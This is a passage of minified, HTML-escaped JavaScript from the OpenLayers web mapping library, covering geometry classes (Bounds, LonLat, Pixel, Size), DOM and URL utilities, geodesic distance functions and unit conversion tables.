d},containsBounds:function(a,b,c){null==b&amp;&amp;(b=!1);null==c&amp;&amp;(c=!0);var d=this.contains(a.left,a.bottom,c),e=this.contains(a.right,a.bottom,c),f=this.contains(a.left,a.top,c);a=this.contains(a.right,a.top,c);return b? d||e||f||a:d&amp;&amp;e&amp;&amp;f&amp;&amp;a},determineQuadrant:function(a){var b="",c=this.getCenterLonLat(),b=b+(a.lat&lt;c.lat?"b":"t");return b+=a.lon&lt;c.lon?"l":"r"},transform:function(a,b){this.centerLonLat=null;var c=OpenLayers.Projection.transform({x:this.left,y:this.bottom},a,b),d=OpenLayers.Projection.transform({x:this.right,y:this.bottom},a,b),e=OpenLayers.Projection.transform({x:this.left,y:this.top},a,b),f=OpenLayers.Projection.transform({x:this.right,y:this.top},a,b);this.left=Math.min(c.x,e.x);this.bottom=Math.min(c.y, d.y);this.right=Math.max(d.x,f.x);this.top=Math.max(e.y,f.y);return this},wrapDateLine:function(a,b){b=b||{};var c=b.leftTolerance||0,d=b.rightTolerance||0,e=this.clone();if(a){for(var f=a.getWidth();e.left&lt;a.left&amp;&amp;e.right-d&lt;=a.left;)e=e.add(f,0);for(;e.left+c>=a.right&amp;&amp;e.right>a.right;)e=e.add(-f,0);c=e.left+c;c&lt;a.right&amp;&amp;(c>a.left&amp;&amp;e.right-d>a.right)&amp;&amp;(e=e.add(-f,0))}return e},CLASS_NAME:"OpenLayers.Bounds"}); OpenLayers.Bounds.fromString=function(a,b){var c=a.split(",");return OpenLayers.Bounds.fromArray(c,b)};OpenLayers.Bounds.fromArray=function(a,b){return!0===b?new OpenLayers.Bounds(a[1],a[0],a[3],a[2]):new OpenLayers.Bounds(a[0],a[1],a[2],a[3])};OpenLayers.Bounds.fromSize=function(a){return new OpenLayers.Bounds(0,a.h,a.w,0)};OpenLayers.Bounds.oppositeQuadrant=function(a){var b;b=""+("t"==a.charAt(0)?"b":"t");return b+="l"==a.charAt(1)?"r":"l"};OpenLayers.Element={visible:function(a){return"none"!=OpenLayers.Util.getElement(a).style.display},toggle:function(){for(var a=0,b=arguments.length;a&lt;b;a++){var c=OpenLayers.Util.getElement(arguments[a]),d=OpenLayers.Element.visible(c)?"none":"";c.style.display=d}},remove:function(a){a=OpenLayers.Util.getElement(a);a.parentNode.removeChild(a)},getHeight:function(a){a=OpenLayers.Util.getElement(a);return a.offsetHeight},hasClass:function(a,b){var c=a.className;return!!c&amp;&amp;RegExp("(^|\\s)"+b+"(\\s|$)").test(c)}, addClass:function(a,b){OpenLayers.Element.hasClass(a,b)||(a.className+=(a.className?" ":"")+b);return a},removeClass:function(a,b){var c=a.className;c&amp;&amp;(a.className=OpenLayers.String.trim(c.replace(RegExp("(^|\\s+)"+b+"(\\s+|$)")," ")));return a},toggleClass:function(a,b){OpenLayers.Element.hasClass(a,b)?OpenLayers.Element.removeClass(a,b):OpenLayers.Element.addClass(a,b);return a},getStyle:function(a,b){a=OpenLayers.Util.getElement(a);var c=null;if(a&amp;&amp;a.style){c=a.style[OpenLayers.String.camelize(b)]; c||(document.defaultView&amp;&amp;document.defaultView.getComputedStyle?c=(c=document.defaultView.getComputedStyle(a,null))?c.getPropertyValue(b):null:a.currentStyle&amp;&amp;(c=a.currentStyle[OpenLayers.String.camelize(b)]));var d=["left","top","right","bottom"];window.opera&amp;&amp;(-1!=OpenLayers.Util.indexOf(d,b)&amp;&amp;"static"==OpenLayers.Element.getStyle(a,"position"))&amp;&amp;(c="auto")}return"auto"==c?null:c}};OpenLayers.LonLat=OpenLayers.Class({lon:0,lat:0,initialize:function(a,b){OpenLayers.Util.isArray(a)&amp;&amp;(b=a[1],a=a[0]);this.lon=OpenLayers.Util.toFloat(a);this.lat=OpenLayers.Util.toFloat(b)},toString:function(){return"lon="+this.lon+",lat="+this.lat},toShortString:function(){return this.lon+", "+this.lat},clone:function(){return new OpenLayers.LonLat(this.lon,this.lat)},add:function(a,b){if(null==a||null==b)throw new TypeError("LonLat.add cannot receive null values");return new OpenLayers.LonLat(this.lon+ OpenLayers.Util.toFloat(a),this.lat+OpenLayers.Util.toFloat(b))},equals:function(a){var b=!1;null!=a&amp;&amp;(b=this.lon==a.lon&amp;&amp;this.lat==a.lat||isNaN(this.lon)&amp;&amp;isNaN(this.lat)&amp;&amp;isNaN(a.lon)&amp;&amp;isNaN(a.lat));return b},transform:function(a,b){var c=OpenLayers.Projection.transform({x:this.lon,y:this.lat},a,b);this.lon=c.x;this.lat=c.y;return this},wrapDateLine:function(a){var b=this.clone();if(a){for(;b.lon&lt;a.left;)b.lon+=a.getWidth();for(;b.lon>a.right;)b.lon-=a.getWidth()}return b},CLASS_NAME:"OpenLayers.LonLat"}); OpenLayers.LonLat.fromString=function(a){a=a.split(",");return new OpenLayers.LonLat(a[0],a[1])};OpenLayers.LonLat.fromArray=function(a){var b=OpenLayers.Util.isArray(a);return new OpenLayers.LonLat(b&amp;&amp;a[0],b&amp;&amp;a[1])};OpenLayers.Pixel=OpenLayers.Class({x:0,y:0,initialize:function(a,b){this.x=parseFloat(a);this.y=parseFloat(b)},toString:function(){return"x="+this.x+",y="+this.y},clone:function(){return new OpenLayers.Pixel(this.x,this.y)},equals:function(a){var b=!1;null!=a&amp;&amp;(b=this.x==a.x&amp;&amp;this.y==a.y||isNaN(this.x)&amp;&amp;isNaN(this.y)&amp;&amp;isNaN(a.x)&amp;&amp;isNaN(a.y));return b},distanceTo:function(a){return Math.sqrt(Math.pow(this.x-a.x,2)+Math.pow(this.y-a.y,2))},add:function(a,b){if(null==a||null==b)throw new TypeError("Pixel.add cannot receive null values"); return new OpenLayers.Pixel(this.x+a,this.y+b)},offset:function(a){var b=this.clone();a&amp;&amp;(b=this.add(a.x,a.y));return b},CLASS_NAME:"OpenLayers.Pixel"});OpenLayers.Size=OpenLayers.Class({w:0,h:0,initialize:function(a,b){this.w=parseFloat(a);this.h=parseFloat(b)},toString:function(){return"w="+this.w+",h="+this.h},clone:function(){return new OpenLayers.Size(this.w,this.h)},equals:function(a){var b=!1;null!=a&amp;&amp;(b=this.w==a.w&amp;&amp;this.h==a.h||isNaN(this.w)&amp;&amp;isNaN(this.h)&amp;&amp;isNaN(a.w)&amp;&amp;isNaN(a.h));return b},CLASS_NAME:"OpenLayers.Size"});OpenLayers.Console={log:function(){},debug:function(){},info:function(){},warn:function(){},error:function(){},userError:function(a){alert(a)},assert:function(){},dir:function(){},dirxml:function(){},trace:function(){},group:function(){},groupEnd:function(){},time:function(){},timeEnd:function(){},profile:function(){},profileEnd:function(){},count:function(){},CLASS_NAME:"OpenLayers.Console"}; (function(){for(var a=document.getElementsByTagName("script"),b=0,c=a.length;b&lt;c;++b)if(-1!=a[b].src.indexOf("firebug.js")&amp;&amp;console){OpenLayers.Util.extend(OpenLayers.Console,console);break}})();OpenLayers.Lang={code:null,defaultCode:"en",getCode:function(){OpenLayers.Lang.code||OpenLayers.Lang.setCode();return OpenLayers.Lang.code},setCode:function(a){var b;a||(a="msie"==OpenLayers.BROWSER_NAME?navigator.userLanguage:navigator.language);a=a.split("-");a[0]=a[0].toLowerCase();"object"==typeof OpenLayers.Lang[a[0]]&amp;&amp;(b=a[0]);if(a[1]){var c=a[0]+"-"+a[1].toUpperCase();"object"==typeof OpenLayers.Lang[c]&amp;&amp;(b=c)}b||(OpenLayers.Console.warn("Failed to find OpenLayers.Lang."+a.join("-")+" dictionary, falling back to default language"), b=OpenLayers.Lang.defaultCode);OpenLayers.Lang.code=b},translate:function(a,b){var c=OpenLayers.Lang[OpenLayers.Lang.getCode()];(c=c&amp;&amp;c[a])||(c=a);b&amp;&amp;(c=OpenLayers.String.format(c,b));return c}};OpenLayers.i18n=OpenLayers.Lang.translate;OpenLayers.Util=OpenLayers.Util||{};OpenLayers.Util.getElement=function(){for(var a=[],b=0,c=arguments.length;b&lt;c;b++){var d=arguments[b];"string"==typeof d&amp;&amp;(d=document.getElementById(d));if(1==arguments.length)return d;a.push(d)}return a};OpenLayers.Util.isElement=function(a){return!(!a||1!==a.nodeType)};OpenLayers.Util.isArray=function(a){return"[object Array]"===Object.prototype.toString.call(a)};OpenLayers.Util.removeItem=function(a,b){for(var c=a.length-1;0&lt;=c;c--)a[c]==b&amp;&amp;a.splice(c,1);return a}; OpenLayers.Util.indexOf=function(a,b){if("function"==typeof a.indexOf)return a.indexOf(b);for(var c=0,d=a.length;c&lt;d;c++)if(a[c]==b)return c;return-1};OpenLayers.Util.dotless=/\./g; OpenLayers.Util.modifyDOMElement=function(a,b,c,d,e,f,g,h){b&amp;&amp;(a.id=b.replace(OpenLayers.Util.dotless,"_"));c&amp;&amp;(a.style.left=c.x+"px",a.style.top=c.y+"px");d&amp;&amp;(a.style.width=d.w+"px",a.style.height=d.h+"px");e&amp;&amp;(a.style.position=e);f&amp;&amp;(a.style.border=f);g&amp;&amp;(a.style.overflow=g);0&lt;=parseFloat(h)&amp;&amp;1>parseFloat(h)?(a.style.filter="alpha(opacity="+100*h+")",a.style.opacity=h):1==parseFloat(h)&amp;&amp;(a.style.filter="",a.style.opacity="")}; OpenLayers.Util.createDiv=function(a,b,c,d,e,f,g,h){var k=document.createElement("div");d&amp;&amp;(k.style.backgroundImage="url("+d+")");a||(a=OpenLayers.Util.createUniqueID("OpenLayersDiv"));e||(e="absolute");OpenLayers.Util.modifyDOMElement(k,a,b,c,e,f,g,h);return k}; OpenLayers.Util.createImage=function(a,b,c,d,e,f,g,h){var k=document.createElement("img");a||(a=OpenLayers.Util.createUniqueID("OpenLayersDiv"));e||(e="relative");OpenLayers.Util.modifyDOMElement(k,a,b,c,e,f,null,g);h&amp;&amp;(k.style.display="none",b=function(){k.style.display="";OpenLayers.Event.stopObservingElement(k)},OpenLayers.Event.observe(k,"load",b),OpenLayers.Event.observe(k,"error",b));k.style.alt=a;k.galleryImg="no";d&amp;&amp;(k.src=d);return k};OpenLayers.IMAGE_RELOAD_ATTEMPTS=0; OpenLayers.Util.alphaHackNeeded=null;OpenLayers.Util.alphaHack=function(){if(null==OpenLayers.Util.alphaHackNeeded){var a=navigator.appVersion.split("MSIE"),a=parseFloat(a[1]),b=!1;try{b=!!document.body.filters}catch(c){}OpenLayers.Util.alphaHackNeeded=b&amp;&amp;5.5&lt;=a&amp;&amp;7>a}return OpenLayers.Util.alphaHackNeeded}; OpenLayers.Util.modifyAlphaImageDiv=function(a,b,c,d,e,f,g,h,k){OpenLayers.Util.modifyDOMElement(a,b,c,d,f,null,null,k);b=a.childNodes[0];e&amp;&amp;(b.src=e);OpenLayers.Util.modifyDOMElement(b,a.id+"_innerImage",null,d,"relative",g);OpenLayers.Util.alphaHack()&amp;&amp;("none"!=a.style.display&amp;&amp;(a.style.display="inline-block"),null==h&amp;&amp;(h="scale"),a.style.filter="progid:DXImageTransform.Microsoft.AlphaImageLoader(src='"+b.src+"', sizingMethod='"+h+"')",0&lt;=parseFloat(a.style.opacity)&amp;&amp;1>parseFloat(a.style.opacity)&amp;&amp; (a.style.filter+=" alpha(opacity="+100*a.style.opacity+")"),b.style.filter="alpha(opacity=0)")};OpenLayers.Util.createAlphaImageDiv=function(a,b,c,d,e,f,g,h,k){var l=OpenLayers.Util.createDiv();k=OpenLayers.Util.createImage(null,null,null,null,null,null,null,k);k.className="olAlphaImg";l.appendChild(k);OpenLayers.Util.modifyAlphaImageDiv(l,a,b,c,d,e,f,g,h);return l};OpenLayers.Util.upperCaseObject=function(a){var b={},c;for(c in a)b[c.toUpperCase()]=a[c];return b}; OpenLayers.Util.applyDefaults=function(a,b){a=a||{};var c="function"==typeof window.Event&amp;&amp;b instanceof window.Event,d;for(d in b)if(void 0===a[d]||!c&amp;&amp;b.hasOwnProperty&amp;&amp;b.hasOwnProperty(d)&amp;&amp;!a.hasOwnProperty(d))a[d]=b[d];!c&amp;&amp;(b&amp;&amp;b.hasOwnProperty&amp;&amp;b.hasOwnProperty("toString")&amp;&amp;!a.hasOwnProperty("toString"))&amp;&amp;(a.toString=b.toString);return a}; OpenLayers.Util.getParameterString=function(a){var b=[],c;for(c in a){var d=a[c];if(null!=d&amp;&amp;"function"!=typeof d){if("object"==typeof d&amp;&amp;d.constructor==Array){for(var e=[],f,g=0,h=d.length;g&lt;h;g++)f=d[g],e.push(encodeURIComponent(null===f||void 0===f?"":f));d=e.join(",")}else d=encodeURIComponent(d);b.push(encodeURIComponent(c)+"="+d)}}return b.join("&amp;")};OpenLayers.Util.urlAppend=function(a,b){var c=a;if(b)var d=(a+" ").split(/[?&amp;]/),c=c+(" "===d.pop()?b:d.length?"&amp;"+b:"?"+b);return c}; OpenLayers.Util.getImagesLocation=function(){return OpenLayers.ImgPath||OpenLayers._getScriptLocation()+"img/"};OpenLayers.Util.getImageLocation=function(a){return OpenLayers.Util.getImagesLocation()+a};OpenLayers.Util.Try=function(){for(var a=null,b=0,c=arguments.length;b&lt;c;b++){var d=arguments[b];try{a=d();break}catch(e){}}return a}; OpenLayers.Util.getXmlNodeValue=function(a){var b=null;OpenLayers.Util.Try(function(){b=a.text;b||(b=a.textContent);b||(b=a.firstChild.nodeValue)},function(){b=a.textContent});return b};OpenLayers.Util.mouseLeft=function(a,b){for(var c=a.relatedTarget?a.relatedTarget:a.toElement;c!=b&amp;&amp;null!=c;)c=c.parentNode;return c!=b};OpenLayers.Util.DEFAULT_PRECISION=14;OpenLayers.Util.toFloat=function(a,b){null==b&amp;&amp;(b=OpenLayers.Util.DEFAULT_PRECISION);"number"!==typeof a&amp;&amp;(a=parseFloat(a));return 0===b?a:parseFloat(a.toPrecision(b))}; OpenLayers.Util.rad=function(a){return a*Math.PI/180};OpenLayers.Util.deg=function(a){return 180*a/Math.PI};OpenLayers.Util.VincentyConstants={a:6378137,b:6356752.3142,f:1/298.257223563}; OpenLayers.Util.distVincenty=function(a,b){for(var c=OpenLayers.Util.VincentyConstants,d=c.a,e=c.b,c=c.f,f=OpenLayers.Util.rad(b.lon-a.lon),g=Math.atan((1-c)*Math.tan(OpenLayers.Util.rad(a.lat))),h=Math.atan((1-c)*Math.tan(OpenLayers.Util.rad(b.lat))),k=Math.sin(g),g=Math.cos(g),l=Math.sin(h),h=Math.cos(h),m=f,n=2*Math.PI,p=20;1E-12&lt;Math.abs(m-n)&amp;&amp;0&lt;--p;){var q=Math.sin(m),r=Math.cos(m),s=Math.sqrt(h*q*h*q+(g*l-k*h*r)*(g*l-k*h*r));if(0==s)return 0;var r=k*l+g*h*r,t=Math.atan2(s,r),u=Math.asin(g*h* q/s),v=Math.cos(u)*Math.cos(u),q=r-2*k*l/v,w=c/16*v*(4+c*(4-3*v)),n=m,m=f+(1-w)*c*Math.sin(u)*(t+w*s*(q+w*r*(-1+2*q*q)))}if(0==p)return NaN;d=v*(d*d-e*e)/(e*e);c=d/1024*(256+d*(-128+d*(74-47*d)));return(e*(1+d/16384*(4096+d*(-768+d*(320-175*d))))*(t-c*s*(q+c/4*(r*(-1+2*q*q)-c/6*q*(-3+4*s*s)*(-3+4*q*q))))).toFixed(3)/1E3}; OpenLayers.Util.destinationVincenty=function(a,b,c){var d=OpenLayers.Util,e=d.VincentyConstants,f=e.a,g=e.b,h=e.f,e=a.lon;a=a.lat;var k=d.rad(b);b=Math.sin(k);k=Math.cos(k);a=(1-h)*Math.tan(d.rad(a));var l=1/Math.sqrt(1+a*a),m=a*l,n=Math.atan2(a,k);a=l*b;for(var p=1-a*a,f=p*(f*f-g*g)/(g*g),q=1+f/16384*(4096+f*(-768+f*(320-175*f))),r=f/1024*(256+f*(-128+f*(74-47*f))),f=c/(g*q),s=2*Math.PI;1E-12&lt;Math.abs(f-s);)var t=Math.cos(2*n+f),u=Math.sin(f),v=Math.cos(f),w=r*u*(t+r/4*(v*(-1+2*t*t)-r/6*t*(-3+4* u*u)*(-3+4*t*t))),s=f,f=c/(g*q)+w;c=m*u-l*v*k;g=Math.atan2(m*v+l*u*k,(1-h)*Math.sqrt(a*a+c*c));b=Math.atan2(u*b,l*v-m*u*k);k=h/16*p*(4+h*(4-3*p));t=b-(1-k)*h*a*(f+k*u*(t+k*v*(-1+2*t*t)));Math.atan2(a,-c);return new OpenLayers.LonLat(e+d.deg(t),d.deg(g))}; OpenLayers.Util.getParameters=function(a,b){b=b||{};a=null===a||void 0===a?window.location.href:a;var c="";if(OpenLayers.String.contains(a,"?"))var d=a.indexOf("?")+1,c=OpenLayers.String.contains(a,"#")?a.indexOf("#"):a.length,c=a.substring(d,c);for(var d={},c=c.split(/[&amp;;]/),e=0,f=c.length;e&lt;f;++e){var g=c[e].split("=");if(g[0]){var h=g[0];try{h=decodeURIComponent(h)}catch(k){h=unescape(h)}g=(g[1]||"").replace(/\+/g," ");try{g=decodeURIComponent(g)}catch(l){g=unescape(g)}!1!==b.splitArgs&amp;&amp;(g=g.split(",")); 1==g.length&amp;&amp;(g=g[0]);d[h]=g}}return d};OpenLayers.Util.lastSeqID=0;OpenLayers.Util.createUniqueID=function(a){a=null==a?"id_":a.replace(OpenLayers.Util.dotless,"_");OpenLayers.Util.lastSeqID+=1;return a+OpenLayers.Util.lastSeqID};OpenLayers.INCHES_PER_UNIT={inches:1,ft:12,mi:63360,m:39.37,km:39370,dd:4374754,yd:36};OpenLayers.INCHES_PER_UNIT["in"]=OpenLayers.INCHES_PER_UNIT.inches;OpenLayers.INCHES_PER_UNIT.degrees=OpenLayers.INCHES_PER_UNIT.dd;OpenLayers.INCHES_PER_UNIT.nmi=1852*OpenLayers.INCHES_PER_UNIT.m; OpenLayers.METERS_PER_INCH=0.0254000508001016; OpenLayers.Util.extend(OpenLayers.INCHES_PER_UNIT,{Inch:OpenLayers.INCHES_PER_UNIT.inches,Meter:1/OpenLayers.METERS_PER_INCH,Foot:0.3048006096012192/OpenLayers.METERS_PER_INCH,IFoot:0.3048/OpenLayers.METERS_PER_INCH,ClarkeFoot:0.3047972651151/OpenLayers.METERS_PER_INCH,SearsFoot:0.30479947153867626/OpenLayers.METERS_PER_INCH,GoldCoastFoot:0.3047997101815088/OpenLayers.METERS_PER_INCH,IInch:0.0254/OpenLayers.METERS_PER_INCH,MicroInch:2.54E-5/OpenLayers.METERS_PER_INCH,Mil:2.54E-8/OpenLayers.METERS_PER_INCH, Centimeter:0.01/OpenLayers.METERS_PER_INCH,Kilometer:1E3/OpenLayers.METERS_PER_INCH,Yard:0.9144018288036576/OpenLayers.METERS_PER_INCH,SearsYard:0.914398414616029/OpenLayers.METERS_PER_INCH,IndianYard:0.9143985307444408/OpenLayers.METERS_PER_INCH,IndianYd37:0.91439523/OpenLayers.METERS_PER_INCH,IndianYd62:0.9143988/OpenLayers.METERS_PER_INCH,IndianYd75:0.9143985/OpenLayers.METERS_PER_INCH,IndianFoot:0.30479951/OpenLayers.METERS_PER_INCH,IndianFt37:0.30479841/OpenLayers.METERS_PER_INCH,IndianFt62:0.3047996/ OpenLayers.METERS_PER_INCH,IndianFt75:0.3047995/OpenLayers.METERS_PER_INCH,Mile:1609.3472186944373/OpenLayers.METERS_PER_INCH,IYard:0.9144/OpenLayers.METERS_PER_INCH,IMile:1609.344/OpenLayers.METERS_PER_INCH,NautM:1852/OpenLayers.METERS_PER_INCH,"Lat-66":110943.31648893273/OpenLayers.METERS_PER_INCH,"Lat-83":110946.25736872235/OpenLayers.METERS_PER_INCH,Decimeter:0.1/OpenLayers.METERS_PER_INCH,Millimeter:0.001/OpenLayers.METERS_PER_INCH,Dekameter:10/OpenLayers.METERS_PER_INCH,Decameter:10/OpenLayers.METERS_PER_INCH, Hectometer:100/OpenLayers.METERS_PER_INCH,GermanMeter:1.0000135965/OpenLayers.METERS_PER_INCH,CaGrid:0.999738/OpenLayers.METERS_PER_INCH,ClarkeChain:20.1166194976/OpenLayers.METERS_PER_INCH,GunterChain:20.11684023368047/OpenLayers.METERS_PER_INCH,BenoitChain:20.116782494375872/OpenLayers.METERS_PER_INCH,SearsChain:20.11676512155/OpenLayers.METERS_PER_INCH,ClarkeLink:0.201166194976/OpenLayers.METERS_PER_INCH,GunterLink:0.2011684023368047/OpenLayers.METERS_PER_INCH,BenoitLink:0.20116782494375873/OpenLayers.METERS_PER_INCH, SearsLink:0.2011676512155/OpenLayers.METERS_PER_INCH,Rod:5.02921005842012/OpenLayers.METERS_PER_INCH,IntnlChain:20.1168/OpenLayers.METERS_PER_INCH,IntnlLink:0.201168/OpenLayers.METERS_PER_INCH,Perch:5.02921005842012/OpenLayers.METERS_PER_INCH,Pole:5.02921005842012/OpenLayers.METERS_PER_INCH,Furlong:201.1684023368046/OpenLayers.METERS_PER_INCH,Rood:3.778266898/OpenLayers.METERS_PER_INCH,CapeFoot:0.3047972615/OpenLayers.METERS_PER_INCH,Brealey:375/OpenLayers.METERS_PER_INCH,ModAmFt:0.304812252984506/ OpenLayers.METERS_PER_INCH,Fathom:1.8288/OpenLayers.METERS_PER_INCH,"NautM-UK":1853.184/OpenLayers.METERS_PER_INCH,"50kilometers":5E4/OpenLayers.METERS_PER_INCH,"150kilometers":15E4/OpenLayers.METERS_PER_INCH}); OpenLayers.Util.extend(OpenLayers.INCHES_PER_UNIT,{mm:OpenLayers.INCHES_PER_UNIT.Meter/1E3,cm:OpenLayers.INCHES_PER_UNIT.Meter/100,dm:100*OpenLayers.INCHES_PER_UNIT.Meter,km:1E3*OpenLayers.INCHES_PER_UNIT.Meter,kmi:OpenLayers.INCHES_PER_UNIT.nmi,fath:OpenLayers.INCHES_PER_UNIT.Fathom,ch:OpenLayers.INCHES_PER_UNIT.IntnlChain,link:OpenLayers.INCHES_PER_UNIT.IntnlLink,"us-in":OpenLayers.INCHES_PER_UNIT.inches,"us-ft":OpenLayers.INCHES_PER_UNIT.Foot,"us-yd":OpenLayers.INCHES_PER_UNIT.Yard,"us-ch":OpenLayers.INCHES_PER_UNIT.GunterChain, "us-mi":OpenLayers.INCHES_PER_UNIT.Mile,"ind-yd":OpenLayers.INCHES_PER_UNIT.IndianYd37,"ind-ft":OpenLayers.INCHES_PER_UNIT.IndianFt37,"ind-ch":20.11669506/OpenLayers.METERS_PER_INCH});OpenLayers.DOTS_PER_INCH=72;OpenLayers.Util.normalizeScale=function(a){return 1&lt;a?1/a:a};OpenLayers.Util.getResolutionFromScale=function(a,b){var c;a&amp;&amp;(null==b&amp;&amp;(b="degrees"),c=1/(OpenLayers.Util.normalizeScale(a)*OpenLayers.INCHES_PER_UNIT[b]*OpenLayers.DOTS_PER_INCH));return c}; OpenLayers.Util.getScaleFromResolution=function(a,b){null==b&amp;&amp;(b="degrees");return a*OpenLayers.INCHES_PER_UNIT[b]*OpenLayers.DOTS_PER_INCH}; OpenLayers.Util.pagePosition=function(a){var b=[0,0],c=OpenLayers.Util.getViewportElement();if(!a||a==window||a==c)return b;var d=OpenLayers.IS_GECKO&amp;&amp;document.getBoxObjectFor&amp;&amp;"absolute"==OpenLayers.Element.getStyle(a,"position")&amp;&amp;(""==a.style.top||""==a.style.left),e=null;if(a.getBoundingClientRect)a=a.getBoundingClientRect(),e=window.pageYOffset||c.scrollTop,b[0]=a.left+(window.pageXOffset||c.scrollLeft),b[1]=a.top+e;else if(document.getBoxObjectFor&amp;&amp;!d)a=document.getBoxObjectFor(a),c=document.getBoxObjectFor(c), b[0]=a.screenX-c.screenX,b[1]=a.screenY-c.screenY;else{b[0]=a.offsetLeft;b[1]=a.offsetTop;e=a.offsetParent;if(e!=a)for(;e;)b[0]+=e.offsetLeft,b[1]+=e.offsetTop,e=e.offsetParent;c=OpenLayers.BROWSER_NAME;if("opera"==c||"safari"==c&amp;&amp;"absolute"==OpenLayers.Element.getStyle(a,"position"))b[1]-=document.body.offsetTop;for(e=a.offsetParent;e&amp;&amp;e!=document.body;){b[0]-=e.scrollLeft;if("opera"!=c||"TR"!=e.tagName)b[1]-=e.scrollTop;e=e.offsetParent}}return b}; OpenLayers.Util.getViewportElement=function(){var a=arguments.callee.viewportElement;void 0==a&amp;&amp;(a="msie"==OpenLayers.BROWSER_NAME&amp;&amp;"CSS1Compat"!=document.compatMode?document.body:document.documentElement,arguments.callee.viewportElement=a);return a}; OpenLayers.Util.isEquivalentUrl=function(a,b,c){c=c||{};OpenLayers.Util.applyDefaults(c,{ignoreCase:!0,ignorePort80:!0,ignoreHash:!0,splitArgs:!1});a=OpenLayers.Util.createUrlObject(a,c);b=OpenLayers.Util.createUrlObject(b,c);for(var d in a)if("args"!==d&amp;&amp;a[d]!=b[d])return!1;for(d in a.args){if(a.args[d]!=b.args[d])return!1;delete b.args[d]}for(d in b.args)return!1;return!0}; OpenLayers.Util.createUrlObject=function(a,b){b=b||{};if(!/^\w+:\/\//.test(a)){var c=window.location,d=c.port?":"+c.port:"",d=c.protocol+"//"+c.host.split(":").shift()+d;0===a.indexOf("/")?a=d+a:(c=c.pathname.split("/"),c.pop(),a=d+c.join("/")+"/"+a)}b.ignoreCase&amp;&amp;(a=a.toLowerCase());c=document.createElement("a");c.href=a;d={};d.host=c.host.split(":").shift();d.protocol=c.protocol;d.port=b.ignorePort80?"80"==c.port||"0"==c.port?"":c.port:""==c.port||"0"==c.port?"80":c.port;d.hash=b.ignoreHash||"#"=== c.hash?"":c.hash;var e=c.search;e||(e=a.indexOf("?"),e=-1!=e?a.substr(e):"");d.args=OpenLayers.Util.getParameters(e,{splitArgs:b.splitArgs});d.pathname="/"==c.pathname.charAt(0)?c.pathname:"/"+c.pathname;return d};OpenLayers.Util.removeTail=function(a){var b=null,b=a.indexOf("?"),c=a.indexOf("#");return b=-1==b?-1!=c?a.substr(0,c):a:-1!=c?a.substr(0,Math.min(b,c)):a.substr(0,b)};OpenLayers.IS_GECKO=function(){var a=navigator.userAgent.toLowerCase();return-1==a.indexOf("webkit")&amp;&amp;-1!=a.indexOf("gecko")}(); OpenLayers.CANVAS_SUPPORTED=function(){var a=document.createElement("canvas");return!(!a.getContext||!a.getContext("2d"))}();OpenLayers.BROWSER_NAME=function(){var a="",b=navigator.userAgent.toLowerCase();-1!=b.indexOf("opera")?a="opera":-1!=b.indexOf("msie")?a="msie":-1!=b.indexOf("safari")?a="safari":-1!=b.indexOf("mozilla")&amp;&amp;(a=-1!=b.indexOf("firefox")?"firefox":"mozilla");return a}();OpenLayers.Util.getBrowserName=function(){return OpenLayers.BROWSER_NAME}; OpenLayers.Util.getRenderedDimensions=function(a,b,c){var d,e,f=document.createElement("div");f.style.visibility="hidden";for(var g=c&amp;&amp;c.containerElement?c.containerElement:document.body,h=!1,k=null,l=g;l&amp;&amp;"body"!=l.tagName.toLowerCase();){var m=OpenLayers.Element.getStyle(l,"position");if("absolute"==m){h=!0;break}else if(m&amp;&amp;"static"!=m)break;l=l.parentNode}!h||0!==g.clientHeight&amp;&amp;0!==g.clientWidth||(k=document.createElement("div"),k.style.visibility="hidden",k.style.position="absolute",k.style.overflow= "visible",k.style.width=document.body.clientWidth+"px",k.style.height=document.body.clientHeight+"px",k.appendChild(f));f.style.position="absolute";b&amp;&amp;(b.w?(d=b.w,f.style.width=d+"px"):b.h&amp;&amp;(e=b.h,f.style.height=e+"px"));c&amp;&amp;c.displayClass&amp;&amp;(f.className=c.displayClass);b=document.createElement("div");b.innerHTML=a;b.style.overflow="visible";if(b.childNodes)for(a=0,c=b.childNodes.length;a&lt;c;a++)b.childNodes[a].style&amp;&amp;(b.childNodes[a].style.overflow="visible");f.appendChild(b);k?g.appendChild(k):g.appendChild(f); d||(d=parseInt(b.scrollWidth),f.style.width=d+"px");e||(e=parseInt(b.scrollHeight));f.removeChild(b);k?(k.removeChild(f),g.removeChild(k)):g.removeChild(f);return new OpenLayers.Size(d,e)}; OpenLayers.Util.getScrollbarWidth=function(){var a=OpenLayers.Util._scrollbarWidth;if(null==a){var b=null,c=null,b=a=0,b=document.createElement("div");b.style.position="absolute";b.style.top="-1000px";b.style.left="-1000px";b.style.width="100px";b.style.height="50px";b.style.overflow="hidden";c=document.createElement("div");c.style.width="100%";c.style.height="200px";b.appendChild(c);document.body.appendChild(b);a=c.offsetWidth;b.style.overflow="scroll";b=c.offsetWidth;document.body.removeChild(document.body.lastChild); OpenLayers.Util._scrollbarWidth=a-b;a=OpenLayers.Util._scrollbarWidth}return a}; OpenLayers.Util.getFormattedLonLat=function(a,b,c){c||(c="dms");a=(a+540)%360-180;var d=Math.abs(a),e=Math.floor(d),f=d=(d-e)/(1/60),d=Math.floor(d),f=Math.round(10*((f-d)/(1/60))),f=f/10;60&lt;=f&amp;&amp;(f-=60,d+=1,60&lt;=d&amp;&amp;(d-=60,e+=1));10>e&amp;&amp;(e="0"+e);e+="\u00b0";0&lt;=c.indexOf("dm")&amp;&amp;(10>d&amp;&amp;(d="0"+d),e+=d+"'",0&lt;=c.indexOf("dms")&amp;&amp;(10>f&amp;&amp;(f="0"+f),e+=f+'"'));return e="lon"==b?e+(0>a?OpenLayers.i18n("W"):OpenLayers.i18n("E")):e+(0>a?OpenLayers.i18n("S"):OpenLayers.i18n("N"))};OpenLayers.Format=OpenLayers.Class({options:null,externalProjection:null,internalProjection:null,data:null,keepData:!1,initialize:function(a){OpenLayers.Util.extend(this,a);this.options=a},destroy:function(){},read:function(a){throw Error("Read not implemented.");},write:function(a){throw Error("Write not implemented.");},CLASS_NAME:"OpenLayers.Format"});OpenLayers.Format.CSWGetRecords=function(a){a=OpenLayers.Util.applyDefaults(a,OpenLayers.Format.CSWGetRecords.DEFAULTS);var b=OpenLayers.Format.CSWGetRecords["v"+a.version.replace(/\./g,"_")];if(!b)throw"Unsupported CSWGetRecords version: "+a.version;return new 